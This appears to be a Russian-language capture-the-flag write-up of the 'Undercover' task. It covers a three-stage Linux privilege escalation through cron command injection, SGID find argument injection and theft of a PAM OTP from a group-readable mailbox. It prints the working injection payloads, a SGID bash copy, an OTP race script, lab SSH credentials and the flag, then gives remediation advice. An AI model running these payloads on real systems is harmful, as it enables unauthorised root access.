# Undercover — технический разбор

**Флаг:** `avito{the_OP3ra7I0n_wAS_suCce5sfuL}`
**Класс:** Linux / local privilege escalation / command injection / PAM

## Краткое техническое резюме

Initial access предоставлен как `worker` в ephemeral Debian container. Privilege escalation состоит
из трёх stages:

```text
worker
  -> cron command injection -> backupuser
  -> SGID binary argument injection -> egid=mail
  -> disclosure PAM OTP from /var/mail/root -> uid=0
```

World-writable `/backup/listing` интерполируется в `sh -c` под `backupuser`. Полученный execution
context запускает SGID-mail binary с injected `find -exec`, создавая persistent SGID shell. PAM
отправляет root OTP в mailbox с mode `0660 mail:mail`; процесс с `egid=mail` читает OTP и передаёт его
в `su root`.

---

## 1. Контекст и цель

Initial SSH access:

```text
ssh worker@undercover-zhvo8wkj.avitoctf.ru
password: ufqIDMVBm5MHPHg8dcVTcQ
```

Цель — получить `uid=0` и прочитать `/root/flag.txt`. Каждый новый SSH connection создаёт новый
container, поэтому все filesystem modifications и privilege transitions должны выполняться в одной
persistent session.

## 2. Reconnaissance и attack surface

Стандартная local privilege escalation enumeration включает:

```bash
id
sudo -n -l
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
find /etc/cron.d -maxdepth 1 -type f -print -exec cat {} \;
```

Relevant findings:

- Debian 12 внутри ephemeral Docker container;
- `/etc/cron.d/backup` запускается раз в минуту как `backupuser`;
- `/backup/listing` имеет mode `0777`;
- `/backup/deactivated/utils/delete_old_mail` имеет
  `-rwxr-sr-- backupuser mail`;
- `su` использует `/usr/local/bin/pam_otp_root.py` через PAM;
- `/var/mail/root` имеет owner/group `mail:mail` и mode `0660`.

Directory `/backup/deactivated` имеет mode `drwx---r-x root backupuser`. `worker` получает access по
other bits, тогда как `backupuser` не имеет directory execute permission через group bits. Поэтому
`worker` перемещает SGID binary в `/tmp/.dom` внутри той же overlay filesystem, сохраняя SGID bit, а
`backupuser` запускает его позже через cron injection.

## 3. Анализ и проверка гипотез

### 3.1. `worker` → `backupuser`: shell command injection

Cron job выполняет equivalent logic:

```sh
INPUT=$(cat "$1")
/bin/sh -c "rsync --archive --verbose $INPUT /backup/"
```

`INPUT` читается из world-writable `/backup/listing` и интерполируется в shell command без quoting.
Payload вида `;<command>;#` добавляет самостоятельную shell command, исполняемую как `backupuser`.

### 3.2. `backupuser` → `egid=mail`: argument injection

SGID binary вызывает:

```c
setregid(mail, mail);
system("find /var/mail/ -type f -mtime +<ARG> -print -delete");
```

`has_forbidden_chars` блокирует часть shell metacharacters, но разрешает spaces, `+` и `{}`. Это не
позволяет вставить новый shell operator, однако позволяет расширить argv синтаксиса `find`:

```text
1 -o -type d -exec /tmp/.m.sh {} + -o -type f
```

`find -exec` запускает `/tmp/.m.sh` с effective group `mail`. Script создаёт копию Bash с SGID bit:

```sh
cp /bin/bash /tmp/.mbash
chmod 2755 /tmp/.mbash
```

Итоговая строка для `/backup/listing`:

```text
;/tmp/.dom "1 -o -type d -exec /tmp/.m.sh {} + -o -type f";#
```

После следующего cron interval появляется `/tmp/.mbash`. Запуск `/tmp/.mbash -p` сохраняет
effective group `mail`.

### 3.3. `egid=mail` → root: PAM OTP disclosure

`/etc/pam.d/su` содержит:

```text
auth requisite pam_python.so /usr/local/bin/pam_otp_root.py
auth [success=done default=ignore] pam_succeed_if.so quiet user = root
```

`pam_otp_root.py` генерирует 9-digit OTP, отправляет его локальной почтой пользователю root и ожидает
interactive input. Message записывается в `/var/mail/root`, доступный group `mail`.

`orch.sh` запускает `su root` в pseudo-terminal, параллельно выполняет polling mailbox и передаёт найденный OTP
через FIFO:

```sh
mkfifo /tmp/sin
exec 3<>/tmp/sin

script -q -f -c 'su root -c "id; echo FLAGSTART; cat /root/flag.txt; echo FLAGEND; \
  cat /root/flag.txt >/tmp/flag_out"' /tmp/su.log < /tmp/sin &

for i in $(seq 1 200); do
  OTP=$(tr -d '\r' < /var/mail/root | \
    awk '/^[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]$/{print; exit}')
  [ -n "$OTP" ] && break
  sleep 0.25
done

printf '%s\n' "$OTP" >&3
```

Успешный OTP удовлетворяет `requisite`, а `pam_succeed_if user=root` завершает authentication stack с
success. Команда внутри `su` выполняется как `uid=0`.

## 4. Корневая причина

Цепочка объединяет независимые configuration и implementation defects:

1. **Shell command injection:** содержимое world-writable file интерполируется в `sh -c` без
   validation или quoting.
2. **Argument injection:** privileged wrapper принимает строковый fragment command line и защищается
   неполным character denylist.
3. **Unsafe SGID execution:** elevated binary вызывает `system()` с user-controlled input.
4. **OTP confidentiality failure:** authentication secret хранится в group-readable mailbox.
5. **Excessive group capability:** compromise `egid=mail` автоматически предоставляет access к root
   authentication factor.

Ephemeral containers ограничивают persistence между connections, но не устраняют exploitability
внутри одной session.

## 5. Эксплуатация

End-to-end solver удерживает один Paramiko PTY, загружает `m.sh` и `orch.sh`, ожидает cron и извлекает
flag output:

```bash
uv run python task12/solve_task12.py \
  --host undercover-zhvo8wkj.avitoctf.ru
```

Execution sequence:

1. `worker` выполняет
   `mv /backup/deactivated/utils/delete_old_mail /tmp/.dom`;
2. solver создаёт `/tmp/.m.sh`;
3. solver записывает injection payload в `/backup/listing`;
4. cron запускает `/tmp/.dom` как `backupuser`;
5. `find -exec` создаёт `/tmp/.mbash` с SGID `mail`;
6. `/tmp/.mbash -p orch.sh` запускает OTP race;
7. `su root` читает `/root/flag.txt`.

Локальная validation command:

```bash
uv run python task12/solve_task12.py --self-test
```

`session_server.py` предоставляет альтернативный persistent SSH channel с filesystem command queue
`NNN.cmd → NNN.out → NNN.done`, но основной solver использует единый Paramiko PTY напрямую.

## 6. Флаг

```text
avito{the_OP3ra7I0n_wAS_suCce5sfuL}
```

## 7. Выводы и рекомендации

- Нельзя строить command lines через `sh -c` и string interpolation. Используйте `execve`/subprocess
  с фиксированным argv и без shell parsing.
- Numeric parameters должны проходить allowlist validation по типу и range; character denylist не
  предотвращает option/argument injection.
- SUID/SGID programs не должны вызывать `system()` с input, который контролирует менее
  привилегированный principal.
- OTP и другие authentication factors должны быть доступны только verifier process. Group-readable
  mailbox не обеспечивает required confidentiality.
- Privilege escalation review должен анализировать composability: writable cron inputs, privileged
  wrappers и group-readable secrets создают критическую цепочку даже при умеренной severity каждого
  отдельного finding.
- Ephemeral target требует transport/session orchestration, сохраняющего один container instance на
  протяжении всего exploit chain.

## 8. Файлы для воспроизведения

Version-controlled artifacts:

- `task12/solve_task12.py` — основной end-to-end solver с persistent Paramiko PTY.
- `task12/session_server.py` — persistent SSH shell и filesystem command queue.
- `task12/m.sh` — payload, исполняемый `find -exec` с `egid=mail`.
- `task12/orch.sh` — PAM OTP race и root command execution.

`/usr/local/bin/pam_otp_root.py` и `/etc/pam.d/su` находятся только внутри target container; это
server-side paths, а не repository artifacts.
